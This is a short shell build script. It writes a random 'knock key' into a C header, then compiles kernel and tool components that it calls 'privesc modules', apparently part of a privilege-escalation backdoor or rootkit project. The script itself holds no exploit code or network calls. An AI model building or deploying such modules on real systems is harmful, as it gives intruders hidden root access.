#!/bin/sh
# yeah idk mane generates a new key and stuff
set -e
cd "$(dirname "$0")"

if [ -z "$KEYREUSE" ]; then
	KEY=$(( $(od -An -N6 -tu8 /dev/urandom | tr -d ' ') % 282429536481 ))
	awk -v k="$KEY" '
	    $0 == "// replaceme"    { print; print "#define KNOCK_KEY " k "ULL"; skip = 1; next }
	    $0 == "// endreplaceme" { skip = 0; print; next }
	    skip != 1               { print }
	' ../include/knock.h > ../include/knock.h.new && mv ../include/knock.h.new ../include/knock.h
	echo "+ new key"
else
	echo "+ ok using old"
fi

cd ../kern && make
cd ../tools && make
echo "+ privesc modules built"
